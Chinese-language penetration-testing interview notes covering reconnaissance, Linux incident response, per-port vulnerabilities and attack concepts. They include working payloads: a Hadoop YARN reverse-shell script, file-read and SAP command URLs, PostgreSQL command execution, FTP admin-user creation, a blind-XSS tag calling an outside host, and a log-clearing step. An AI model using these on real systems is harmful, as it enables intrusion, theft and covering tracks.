---
title: 全方面面试
index: true
password: d5e00e2760d78ff8d6c318ae6734b10f
order: 4
isOriginal : true
category:
  - 面试
tag:
  - 面试题
---

# 编辑器漏洞

Ewebeditor编辑器漏洞 （数据库路径、文件上传、目录遍历、SQL注入）

Fckeditor编辑器漏洞（文件上传、解析漏洞）

ckfinder编辑器漏洞

kindeditor漏洞（文件上传）（版本是4.1.10可以进行尝试如下路径是否存在有必要验证文件 upload_json.*）

# 渗透测试

信息收集

```
网站的关于页面／网站地图
whois反查
一些网站里面的跳转请求（也可以关注一下app）
还有就是百度，有些会在title 和 copyright信息里面出现该公司的信息
网站html源码：主要就是一些图片、js、css等，也会出现一些域名
apk反编译源码里面
子域名信息收集
通过工具：subdomain lijiejie的子域名收集工具；layer
```

敏感信息收集

```
github源代码：网上有工具（https://github.com/repoog/GitPrey）

svn信息泄漏：这个只能用扫描器了

敏感文件：比如数据库配置文件啦、网站源码啊、数据库备份文件等等

敏感目录：网站后台目录／一些登录地址／一些接口目录

email：邮箱命名规则、公司是否具有邮箱默认密码（这个可以采取社工）

员工号：很多oa、um、sso系统都是采用员工号登录的，所以知道员工号的规则很多时候能帮助我们进行撞库。

商家信息：如果是一些具有商家系统的，能收集到一些商家账户（自己搞去，可以注册，注册资料请百度）就可以进入很多系统来测试了。
```

### 老男孩渗透测试流程

一、信息收集

```
1.获取域名的 whois 信息,获取注册者邮箱姓名电话等。 

2.通过站长之家、明小子、k8、站长之家等查询服务器旁站以及子域名站点，因为主站一般 比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。

 3、通过 DNS 域传送漏洞、备份号查询、SSl 证书、APP、微信公众号、暴力破解、DNS 历 史记录、K8 C 段查询、Jsfinder、360 或华为威胁情报、证书序列号获取企业二级域名与 ip。 

4、通过 Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web 中间件，看看是否存 在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞 

5.通过 7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如 php 探针（phpinfo.php）、管理员备份文件。 

6.google hack 进一步探测网站的信息，后台，敏感文件

7、敏感信息收集，如 github 源码、用 7kb、破壳扫源代码泄露（.hg、.git、cvs、svn、.DS_store 源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟 馗之眼、天眼查、威胁情报、微步在线等 

8、通过 Wappalyzer、御剑工具对网站指纹识别（包括，cms，cdn，证书等），dns 记录 
```

二、漏洞扫描

```
1)用 AWVS、APPSCAN、长亭科技的 Xray 等扫描器检测 Web 漏洞，如 XSS,XSRF,sql 注 入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令 执行，弱口令，上传，编辑器漏洞，暴力破解等 

2)用 namp、天镜、Nessus、极光等扫描系统 ip，对扫描出来的高危漏洞进行测试，如 ms08- 067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝 2 代、cve-2017-7494（samba）、 cve-2014-6271(破壳)、php cgi 等相关漏洞验证。 
```

三、漏洞利用

```
利用以上的方式拿到 webshell，或者其他权限 
```

四、权限提升

```
提权服务器，比如 windows 下 mysql 的 udf 提权，
serv-u 提权，windows 低版本的漏洞， 
如 iis6,pr,巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以 及 oracle 低权限提权 
```

五、日志清理

```
操作系统、中间件、数据库等日志进行清除 
```

六、总结报告及修复方案

### 渗透测试流程

```
客户直接给一个域名（或公司里面所有域名），直接挂扫描器没漏洞的话，手工扫描, 长亭科技的xray（被动扫描器），手工测一些越权，逻辑漏洞，弱口令，明文传输，弱验证码等，

如果客户只给公司名称或单个域名，搜集二级域名（fofa）IP地址，通过ssl证书搜集二级域名，暴力破解，apk反编译提取里边接口地址，还有搜集一些指纹信息，用浏览器插件wapplayer查询语言（php），框架（jboss），

在ping一下看有没有cdn，有的话用fofa找真实IP地址，有waf的话用绕过waf的方法试一下绕过，之后手工测一些漏洞，测完后写测试报告
```

### 怎样进行信息收集

```
1.获取目标真实IP，若有CDN就绕一下

2.通过真实IP去进行半开放的端口扫描，获取目标服务

3.通过审计JS代码 + Jsfinder工具查看是否存在接口泄露可以使我们进一步利用

4.对站点进行指纹识别，查看CMS历史漏洞

5.通过乌云查找目标的历史漏洞，查看脆弱点

6.通过Google黑语法搜索目标站点的敏感关键词，如：登录、后台、学号、上传

7.通过网络搜索引擎，fofa，bountyteam等收集站点信息

8.通过dirsearch、御剑、dirmap等工具扫描目标站点文件，查看是否存在未授权访问文件或更多功能点

9.扫描目标站点要注意403、302，对其进行二级目录扫描

9.通过潮汐、在线子域名、layer子域名挖掘机进行子域名收集

10.通过nmap、goby对C段进行信息收集
```

### 做了cdn的网站如何获取真实IP

```
全球ping

查询历史解析记录

探针文件如phpinfo等

利用命令执行连接我们的服务器或DNSlog

寻找网站配置

通过二级域名

全网扫描，利用fofa等搜索引擎title="”匹配

利用邮箱反查
```

### 判断CDN的存在

```
通过nslookup命令进行检测，如果返回域名解析对应多个IP地址多半是使用了CDN

利用在线网站进行全国多地区的ping服务器操作，然后对比每个地区ping出的ip结果，查看这些ip是否一致，如果都是一样，极有可能不存在CDN，。如果ip大多不太一样或者规律性不强，可以尝试查询这些ip的归属地，判断是否存在CDN。以http:/ping.chinaz.com为例子，去ping一下百度搜索的ip，这种就是很大几率存在CDN的。
```

### 当你发现这个网站有 CDN 的时候应该怎么办？

```
我们先看一下这个网站是否有邮箱功能，比如注册的时候需要邮箱验证码，通过邮箱我们可以收集到其网站真实IP。

国外访问，很多CDN只是针对国内，在国外并没有部署，即使在国外部署了，也不可能部署的那么全，直接搞个毛里求斯什么的可以得到。

查询域名解析记录，可能一开始公司做的比较小，没有CDN，后期才有了CDN,最开始的就是它的真实IP。

查询分站IP，大多数分站不会做CDN。
```

### 渗透测试过程中发现一个只能上传zip文件的功能，有什么可能的思路？

```
shell压缩上传，程序自解压getshell

尝试解析漏洞getshell

寻找文件包含漏洞

木马钓鱼管理员
```

# LINUX

### 命令

```
通过top命令查看cpu/内存占用异常的进程
```

### 网络状态

```
查看网络监听的tcp和udp端口及对应的进程信息netstat -tulnp

查看网络所有的网络连接： netstat -anp

通过网络监听及网络连接来辅助定位异常进程

注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接是可以被隐藏的。
```

### 进程信息

```
如果系统被发现异常，那很大概率是有异常进程在执行

通过ps查看进程信息

ps / ps -aux / ps -ef

通过grep -v 过滤掉一些正常进程，再逐个排查异常进程

通过top命令查看cpu/内存占用异常的进程

top

查找ps中隐藏的进程，通过对比proc中的进程id和ps中的进程id，判断是否有些进程在proc中但不在ps中显示

ps -ef | awk '{print $2}' | sort -n | uniq > ps.p

ls /proc | sort -n |uniq > proc.p

diff ps.p proc.p

执行pstree查看进程树：pstree -p
```

### 定位恶意文件

**首先执行stat /usr/bin/ls， stat /usr/bin/lsof, stat /usr/bin/stat， 确认这几个文件没有被修改过**

**ls**

```
排查 可读写执行目录

ls –alt /tmp/; ls -alt /var/tmp; ls -alt /dev/shm

排序 $PATH 环境变量下的目录的文件，比如

ls -alt /bin, ls -alt /sbin, ls -alt /usr/bin, ls -alt /usr/sbin 等

递归查看所有文件

ls -aR

stat

针对任何的可以文件，都通过stat命令查看各个时间点。
```

** losf **

```
lsof

另外可以通过lsof命令联合查看，lsof常用options如下

lsof 列出所有进程调用

lsof abc.txt 显示开启文件abc.txt的进程

lsof -c abc 显示abc进程现在打开的文件

lsof -p 1234 列出进程号为1234的进程所打开的文件

lsof -g gid 显示归属gid的进程情况

lsof +d /usr/local/ 显示目录下被进程开启的文件

lsof +D /usr/local/ 同上，但是会搜索目录下的目录，时间较长

lsof -d 4 显示使用fd为4的进程

lsof -i :port 检查哪个进程使用这个端口

lsof -i 用以显示符合条件的进程情况
```

** find**

```
find

通过find命令来查找近期新增/修改文件

例如要查找24小时内被修改的JSP文件

最后一次修改发生在距离当前时间n24小时至(n+1)24 小时

find ./ -mtime 0 -name "*.jsp"

查找72小时内新增的文件

find / -ctime -2

查找特殊权限的文件

find / *.jsp -perm 4777
```

**diff**

```
diff

用diff命令把重要的目录做对比，分别对比入侵环境和纯净环境下的不同

比如把连个环境的重要目录都拷贝到PC-x中，利用下面的命令对比两个目录

diff -r {dir 1} {dir 2}
```

### 分析恶意程序

```
若发现有非法进程，运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为异常进程的pid），查看下 pid 所对应的进程文件路径。

运行cat /proc/$PID/cmdline查看进程执行的命令及参数

通过file命令查看恶意程序文件类型，比如：file /tmp/.sh

如果是ELF文件，可以通过strings查看ELF里带的字符串，可能会泄露一些信息，比如 stirngs /tmp/.elf

如果碰到恶意程序被删除，可以通过内存转储的方式从内存中导出恶意程序
```

### 从内存拷贝恢复被删除文件

```
cp /proc/[pid]/exe /tmp/malware.dump
```

### 导出进程内存

```
cat /proc/[pid]/maps

7ff48bb5d000-7ff48bb5e000

gdb --pid [pid]

dump memory /tmp/malware.dump 0x7ff48bb5d000 0x7ff48bb5e000

通过 stat命令查看恶意程序的Access，Modify，Change时间，了解系统大概是什么时间被入侵。

可以把可疑的恶意程序或内存转储的程序上传到virustotal进行病毒扫描

其他可能用到的命令，比如strings, strace, lsattr, chattr -i， getfacl，setfacl等。
```

### rootkit自动化查杀

chkrootkit

```
使用方法：

wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz

tar zxvf chkrootkit.tar.gz

cd chkrootkit-0.53

make sense

./chkrootkit
```

rkhunter

```
使用方法：

wget https://fossies.org/linux/privat/rkhunter-1.4.6.tar.gz

tar -zxvf rkhunter-1.4.6.tar.gz

cd rkhunter-1.4.6

./installer.sh --install

rkhunter -c
```

### 开机启动

```
遍历查看 /etc/ 目录下的init开始的系列目录及文件，以及rc开头的系列目录及文件

查看 /etc/init.d/目录下的文件

查询系统服务，特别是开机自启动的服务

chkconfig –list

service –status-all
```

### 检测动态库劫持

```
查看环境变量动态库劫持

busybox echo $LD_PRELOAD

查看配置文件动态库劫持

busybox cat /etc/ld.so.preload

如果不确定动态库是不是恶意的，可以把动态库上传到virustotal检测。
```

### 定时任务

重点查看以下罗列的目录及文件内容

```
/etc/crontab

/etc/cron.d/*

/etc/cron.daily/*

/etc/cron.hourly/*

/etc/cron.monthly/*

/etc/cron.weekly/

/etc/anacrontab

/var/spool/cron/*

/var/spool/anacron/*
```

通过crontab -l罗列当前用户的定时任务

### 系统日志包括

```
/var/log/cron 记录了系统定时任务相关的日志

/var/log/cups 记录打印信息的日志

/var/log/dmesg 记录了系统在开机时内核自检的信息

/var/log/mailog 记录邮件信息

/var/log/message 记录系统重要信息的日志

/var/log/btmp 记录错误登录日志。 要使用lastb命令查看

/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志。 要使用lastlog命令查看

/var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。 要使用last命令查看

/var/log/utmp 记录当前已经登录的用户信息。要使用w,who,users命令查看

/var/log/secure 记录验证和授权方面的信息，比如SSH登录，su切换用户，sudo授权
```

### 内核驱动

```
查看内核模块加载情况：lsmod
```

### ssh排查

```
到 /root/.ssh 目录下查看是否有公钥，以及查看known_hosts文件，看本机通过ssh连接过哪些主机，很可能这些主机有一部分也被入侵了。
```

### 恶意进程关联

```
大多数情况恶意进程的父进程都是1，而有些情况下恶意进程的父进程可能不是1，比如父进程是httpd，这种情况下，就可以大胆猜测攻击者是通过利用父进程的漏洞达成攻击。

通过命令ps -ef 查看进程的父进程pid也就是ppid

通过 ps auxef 查看恶意进程启动的用户，如果发现比如是mysql用户启动，那么就可以推断是通过mysql服务入侵。
```

### 查看ssh登录记录

```
less /var/log/secure | grep 'Accepted'
```

### 弱密码/默认密码

```
首先通过netstat查看对外开放的服务，确认这些服务（比如mysql，redis，zookeeper，tomcat等）是否有配置认证，认证使用的是否为弱密码或者默认密码

查看这些服务的日志信息，看是否有入侵记录
```

# 常见端口漏洞

## 1、远程管理端口

### 22 端口（SSH）

```
安全攻击：弱口令、暴力猜解、用户名枚举

利用方式：
1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，
2、利用弱口令/暴力破解，获取目标主机权限。
```

### 23 端口（Telnet）

```
安全漏洞：弱口令、明文传输

利用方式：

1、通过弱口令或暴力破解，获取目标主机权限

2、嗅探抓取telnet明文账户密码
```

### 3389 端口（RDP）

```
安全漏洞：暴力破解利用方式：通过弱口令或暴力破解，获取目标主机权限
```

### 5632 端口（Pcanywhere）

```
安全漏洞：弱口令、暴力破解利用方式：通过弱口令或暴力破解，获取目标主机权限
```

### 5900 端口（VNC）

```
安全漏洞：弱口令、暴力破解利用方式：通过弱口令或暴力破解，获取目标主机权限
```

## 2、Web中间件/服务端口

### 1090/1099 端口（RMI）

```
安全漏洞：JAVA RMI 反序列化远程命令执行漏洞
利用方式：使用nmap检测端口信息
端口信息：1099/1090 Java-rmi Java RMI Registry
检测工具：attackRMI.jar
```

### 7001 端口（Weblogic）

```
安全漏洞：弱口令、SSRF、反序列化漏洞

利用方式：

1、控制台弱口令上传war木马

2、SSRF内网探测

3、反序列化远程代码执行等
```

### 8000 端口（jdwp）

```
安全漏洞：JDWP 远程命令执行漏洞

端口信息： 8000 jdwp java Debug Wire Protocol

检测工具：https://github.com/IOActive/jdwp-shellifier
```

### 8080 端口（Tomcat）

```
安全漏洞：弱口令、示例目录

利用方式：通过弱口令登录控制台，上传war包
```

### 8080 端口（Jboss）

```
安全漏洞：未授权访问、反序列化。

利用方式：

1、未授权访问控制台，远程部署木马

2、反序列化导致远程命令执行等

检测工具：https://github.com/joaomatosf/jexboss
```

### 8080 端口（Resin）

```
安全漏洞：目录遍历、远程文件读取

利用方式：通过目录遍历/远程文件读取获取敏感信息，为进一步攻击提供必要的信息。

任意文件读取POC：

payload1 = "/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd"

payload2 = "/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd"

payload3 = "/ ..\\web-inf"
```

### 8080 端口（Jetty）

```
安全漏洞：远程共享缓冲区泄漏

利用方式：攻击者可以通过精心构造headers值来触发异常并偏移到共享缓冲区，其中包含了之前其他用户提交的请求，服务器会根据攻击者的payload返回特定位置的数据。

检测工具：https://github.com/GDSSecurity/Jetleak-Testing-Script
```

### 8080 端口（GlassFish）

```
安全漏洞：弱口令、任意文件读取

利用方式：

1、弱口令admin/admin，直接部署shell

2、任意文件读取获取服务器敏感配置信息
```

### 8080 端口（Jenkins）

```
安全漏洞：未授权访问 、远程代码执行

利用方式：访问如下url，可以执行脚本命令，反弹shell，写入webshell等

http://<target>:8080/managehttp://<target>:8080/script
```

### 8161 端口（ActiveMQ）

```
安全漏洞：弱口令、任意文件写入、反序列化

利用方式：

默认密码admin/admin登陆控制台

写入webshell

上传ssh key等方式
```

### 9043 端口（webSphere）

```
安全漏洞：控制台弱口令、远程代码执行后台地址：https://:9043/ibm/console/logon.jsp
```

### 50000 端口 （SAP）

```
安全漏洞：远程代码执行

利用方式：攻击者通过构造url请求，实现远程代码执行。

POC:http://<target>:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=cmd.exe /c ipconfig /all
```

### 50070 端口（hadoop）

```
安全漏洞：未授权命令执行

import requests
target = 'http://127.0.0.1:8088/'
lhost = '192.168.253.128'
url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```

## 3、数据库端口

### 389 端口（ldap）

安全漏洞：未授权访问 、弱口令利用方式：通过LdapBrowser工具直接连入。

### 1433 端口（Mssql）

安全漏洞：弱口令、暴力破解利用方式：差异备份getshell、SA账户提权等

### 1521 端口（Oracle）

安全漏洞：弱口令、暴力破解利用方式：通过弱口令/暴力破解进行入侵。

### 3306 端口（MySQL）

安全漏洞：弱口令、暴力破解利用方式：利用日志写入webshell、udf提权、mof提权等。

### 5432 端口（ PostgreSQL）

安全漏洞：弱口令、高权限命令执行利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。。PoC参考： DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;

### 5984 端口（CouchDB）

安全漏洞：垂直权限绕过、任意命令执行利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。后台访问：http://<target>:5984/_utils

### 6379 端口（Redis）

安全漏洞：未授权访问利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等。

### 9200 端口（elasticsearch）

安全漏洞：未授权访问、命令执行检测方式：1、直接访问如下url，获取相关敏感信息。 http://<target>:9200/_nodes 查看节点数据 http://<target>:9200/_river 查看数据库敏感信息2、通过构造特定的数据包，执行任意命令。

### 11211 端口（MemCache）

安全漏洞：未授权访问检测方式：无需用户名密码，可以直接连接memcache 服务的

11211端口。nc -vv <target> 11211

### 27017 端口（Mongodb）

安全漏洞：未授权访问、弱口令利用方式：未授权访问/弱口令，远程连入数据库，导致敏感信息泄露。

## 4、常见协议端口

### 21 端口（FTP)

安全漏洞：1、配置不当 2、明文传输 3、第三方软件提权利用方式：1、匿名登录或弱口令2、嗅探ftp用户名和密码3、Serv-U权限较大的账号可导致系统命令执行。FTP提权命令： ## 增加系统用户 Quote site exec net user 4567 4567 /add ## 提升到管理员权限 Quote site exec net localgroup administrators 4567 /add

### 25 端口（SMTP）

攻击方式：1、匿名发送邮件 2、弱口令 3、SMTP用户枚举利用方式：1、SMTP服务器配置不当，攻击者可以使用任意用户发送邮件。2、SMTP弱口令扫描，获取用户账号密码，发送邮件钓鱼。3、通过SMTP用户枚举获取用户名： nmap -p 25 -- smtp-enum-users.nse <target>

### 53 端口（DNS）

安全攻击：1、DNS域传送漏洞、DNS欺骗、DNS缓存投毒检测方式：1、DNS域传送漏洞，Windows下检测使用nslookup命令，Linux下检测使用dig命令，通过执行命令可以清楚的看到域名解析情况。2、DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。3、DNS缓存投毒是攻击者欺骗DNS服务器相信伪造的DNS响应的真实性。

### 161 端口（SNMP）

安全漏洞：默认团体名/弱口令访问利用方式：通过nmap自带的审计脚本进行检测，可能导致敏感信息泄露。。1、弱口令检测：nmap –sU –p161 –script=snmp-brute <target>2、获取系统信息：nmap –sU –p161 –script=snmp-sysdescr <target>3、获取用户信息：nmap -sU -p161 --script=snmp-win32-user <target>4、获取网络端口状态：nmap -sU -p161 --script=snmp-netstat <target>

### 443 端口（SSL）

安全漏洞：OpenSSL 心脏出血利用方式：攻击者可以远程读取存在漏洞版本的openssl服务器内存中长大64K的数据。扫描脚本：nmap -sV --script=ssl-heartbleed <target>

### 445 端口（SMB）

安全漏洞：信息泄露、远程代码执行利用方式：可利用共享获取敏感信息、缓冲区溢出导致远程代码执行，如ms17010。

### 873 端口（Rsync）

安全漏洞：匿名访问、弱口令利用方式：攻击者可以执行下载/上传等操作，也可以尝试上传webshell。1、下载：#rsync -avz a.b.c.d::path/file path/filiname 2、上传：#rsync -avz path/filename a.b.c.d::path/file

### 2181 端口（Zookeeper）

安全漏洞：未授权访问检测方式：攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。 echo envi | nc ip port

### 2375 端口（Docker）

安全漏洞：未授权方式检测方式：通过docker daemon api 执行docker命令。#列出容器信息，效果与docker ps -a 一致。 curl http://<target>:2375/containers/json docker -H tcp://<target>:2375 start <Container Id>

# HTTP

## POST四种传参方式

```
1. application/x-www-form-urlencoded

2. multipart/form-data

3. applocation-json

4. test/xml
```

### HTTP请求

```
Get、referer、User-Agent、host、cookie、X_Forwarded_FOR
```

### HTTP方法

```
POST HEAD OPTIONS PUT MOVE COPY 
```

### 请求消息头

```
Referer。这个消息头用于指示提出当前请求的原始URL

User-Agent  这个消息头提供与浏览器或生成请求的其他客户端软件有关的信息

Origin。这个消息头用在跨域Ajax求中，用于指示提出请求的域
```

### HTTP网页状态码

```
403 （禁止） 服务器拒绝请求

404 （未找到） 服务器找不到请求的网页

301 （永久移动） 请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置

302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求

500 （服务器内部错误） 服务器遇到错误，无法完成请求

501 （尚未实施） 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码

502 （错误网关） 服务器作为网关或代理，从上游服务器收到无效响应

503 （服务不可用） 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态

504 （网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求

505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本
```

# 其他问题

### 1、鱼叉式攻击和水坑攻击？

```
鱼叉攻击：指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马

水坑攻击：分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，将网站攻破并植入恶意程序，等待目标访问
```

### 2、缓冲区溢出原理和防御

```
原理：

当写入缓冲区的数据量超过该缓冲区所能承受的最大限度时，发生缓冲区溢出，溢出的数据被黑客加以利用，形成远程代码执行漏洞。


防御：

基于操作系统防御

缓冲区边界检查

安全编程
```

### 3、条件竞争漏洞原理与举例

```
条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生

举个例子，很多web程序都会有上传文件的功能，头像和图像等，服务器肯定会检查文件是否满足条件，不满足的要被删除 那么问题就在于，如果我们采用大量的并发请求，就传递一个生成恶意webshell的图像，访问它就可以生成webshell。在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell文件，后续的一切就都不是问题了
```

### 4、什么是虚拟机逃逸？

```
利用虚拟机软件或者虚拟机中运行的软件的漏洞进行攻击，以达到攻击或控制虚拟机宿主操作系统的目的
```

### 5、业务上线前，怎么测试，从哪些角度测试

```
安全测试：寻找产品漏洞，页面漏洞，服务漏洞，敏感信息泄露，逻辑漏洞，弱口令

性能测试：压力测试

功能完整性测试
```

### 6、GPC是什么？开启了怎么绕过

```
GPC：

php.ini配置文件中的magic_quotes_gpc，实现为get、post、cookie传入的单引号、双引号、反斜线、NULL字符添加反斜线\

绕过：

PHP5的GPC对$_SERVER的忽略，可在http请求头注入

二次注入

宽字节注入
```

### 8、如何实现跨域？

```
jsonp

CORS跨域资源共享

代理跨域请求

Html5 postMessage 方法

修改 document.domain 跨子域

基于 Html5 websocket 协议

document.xxx + iframe
```

### 9、DNSlog在渗透测试中的实战技巧

```
1. SSRF盲打

某系统的机票信息存在导出功能，抓包修改导出信息的请求queryPath参数路径为自己的DNSlog

可以看到DNSlog平台成功记录访问请求，证明SSRF漏洞

1. XSS盲打

实战中构成致命性损伤的XSS类型就是储存型XSS，一般是从前端打到后台

比如：在一个留言框，输入payload （好的管理员！<script src=http://testxss.a.com></script）

因为script标签的src是在加载后就自动请求的，并且http协议仍然会用到dns协议，当管理员从留言板看到这条消息浏览器会自动去请求http ://testxss.a.com,这样的话，就会在DNSlog里留下 testxss.a.com 10.0.0.0

当我们在DNSlog中看到这条记录时间就说明盲打XSS存在了

1. XXE盲打

对于没有回显的XXE漏洞

1. SQL盲注

无论布尔盲注还是时间型盲注，在现代WAF的防护下，很可能导致IP被ban。

结合DNSlog，如遇到Mysql的盲注时，可以利用内置函数load _file()，来完成DNSlog，load _file()不仅能够加载本地文件

Select load_file(‘\\\\SQL注入查询语句.dnslog’)

1. RCE盲打

%USERNAME%.dnslog
```

### 10、中间人攻击？

```
原理：

https是 对http内容的[加密](https://so.csdn.net/so/search?q=加密&spm=1001.2101.3001.7020)，中间人攻击是指攻击者通过与客户端和客户端的目标服务器同时建立连接，作为客户端和服务器的桥梁，处理双方的数据，整个会话期间的内容几乎是完全被攻击者控制的。攻击者可以拦截双方的会话并且插入新的数据内容。

"中间人攻击”原理

1.客户端请求被劫持（如DNS劫持等），所有的客户端请求均被转发至中间人的服务器；

2.中间人服务器返回中间人伪造的"伪证书”（包含伪公钥）；

3.客户端创建随机数，通过中间人证书的伪公钥对随机数进行加密后传输给中间人，然后凭随机数构造对称加密算法对要进行传输的数据内容进行对称加密后传输；

4.中间人因为拥有客户端生成的随机数，从而能够通过对称加密算法进行数据内容解密；

5.中间人再以"伪客户端”的身份向正规的服务端发起请求；

6.因为中间人与服务器之间的通信过程是合法的，正规服务端通过建立的安全通道返回加密后的数据内容；

7.中间人凭借与正规服务器建立的对称加密算法进行数据内容解密；

8.中间人再通过与客户端建立的对称加密算法对正规服务器返回的数据内容进行加密传输；

9.客户端通过中间人建立的对称加密算法对返回的数据内容进行解密；

由于缺少对证书的真伪性验证，所有客户端即使发起了Https请求，但客户端完全不知道自己发送的请求已经被第三方拦截，导致其中传输的数据内容被中间人窃取。

防御：

在主机绑定网关MAC与IP地址为静态

在网关绑定主机MAC与IP地址

使用ARP防火墙
```

### 11、JAVA中间件的漏洞，举几个例子？

```
JBoss反序列化

WebLogic反序列化

tomcat任意文件写入、弱口令+后台getshell
```

### 12、http only的作用，有http only怎么获取cookie

```
如果在cookie中设置了http only属性，那么将不能从 JS脚本中获取到cookie信息，也就是说不能用 document.cookie()来获取cookie。

1.信息泄露，http only是只对指定的cookie做保护，所以前端是会泄露指定保护的cookie

2.配置错误，可能在设置 hettp only的时候只对某个 cookie做了保护，关键的 cookie未保护 

3.如果apache版本较低，使用CVE-2012-0053 ,通过发送超长 cookie，可以获取 http only保护下的cookie
```

### HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie

```
劫持登录页面钓鱼绕过
```

### python有哪些框架，其中出现过哪些漏洞

```
Django、Flask、Scrapy

Django任意代码执行

Flask模板注入
```

### reverse_tcp 和 bind_tcp 的区别？

```
reverse_tcp：攻击机设置一个端口和IP，Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经连接

白话就是让受控机主动连接我们

bind_tcp：攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入

白话就是我们主动连接受控机

使用reverse_tcp较为安全，一般不会被防火墙发现
```

### 13、如何判别web服务器是windows还是linux

```
nmap带上-O参数

查看http报头Server字段

Windows对于大小写不敏感，替换某个字母为大写返回正常为Windows，反之Linux

TTL返回值，TTL为64，有很大可能性为Linux，TTL为128，有很大可能性为Windows，TTL为255，有很大可能性为UNIX（可修改TTL）
```

### 14、如何进行身份验证绕过

```
刷新令牌终端配置错误

SSO配置不正确

基于CMS的访问漏洞

JWT令牌的使用

将身份验证类型更改为Null
```

### 15、JAVA反射

对于任意一个类，都能够得到这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为 Java 语言的反射机制。

### 16、JWT的攻击手法？（头部、负载、签名）

加密算法置为空绕过身份验证

爆破弱密钥

kid参数：任意文件读取、SQL注入、命令注入

未校验签名，内容重新编码

### 17、了解过websocket吗？

WebSocket是一种在单个TCP连接上进行全双工通信的协议，最大特点是服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话。

### 18、应用有漏洞，但是无法修复和停用，你怎么办

限制IP白名单访问

使用WAF、IDS、防火墙设备

# Wireshark分析

### wireshark流量分析

拿到流量包后将其导入wireshark中，使用过滤规则对流量包进行分析，常用的过滤规则有：

http contains "关键字"

http.response.code == 200

http.request.method == POST

tcp.prot == 80

ip.addr == "10.1.1.1"

ip.src

ip.dst

### wireshark软件使用方法

\1. 打开wireshark后，按ctrl+K，勾选需要抓包的网卡，start开始抓包

\2. wireshark过滤器表达式

协议过滤

TCP：只显示TCP协议的数据流

HTTP：只显示HTTP协议的数据流

ICMP：只显示ICMP协议的数据流

ARP：只显示ARP协议的数据流

DNS：显示DNS协议的数据流

IP过滤

ip.addr = 192.168.116.138，只显示ip为192.168.116.138有关的数据流

ip.src = 192.168.116.138，只显示源IP地址为192.168.116.138的数据流

ip.dst = 192.168.116.138，只显示目标IP地址为192.168.116.138的数据流

端口过滤

tcp.port == 80，只显示80端口TCP数据流

udp.prot == 67，只显示67端口UDP数据流

tcp.srcport == 80, 只显示源地址的80端口数据流

tcp.dstport == 80，只显示目的地址80端口数据流

过滤HTTP协议

http.request.method=="GET"，显示get请求

http.request.method=="POST" ，显示POST请求

http.request.url contains admin ，显示url中包含admin的 请求

http.request.code==404，显示状态码为404

连接符

and，or

如tcp.port == 80 and ip.addr = 192.168.116.138

### 如何排查流量

1、使用过滤功能对正常报文排查

2、查看请求包，无法判断URL的安全性，可以根据URL查询威胁情报库，看看是否为恶意URL。根据云沙箱分析为安全。基本可以判断是安全的网站。

3、查看返回包 也可以查看返回包的报文，通过返回结果判断直接访问网站，网页也确实只有一句话。该操作建议在沙箱环境执行，以免连接到恶意网站。

可疑文件传输报文排查

查看请求包，无法判断可疑借助RUL威胁情报库确定

导出文件（可以直接在文件传输包中使用导出分级字节流的功能导出报文中的文件）

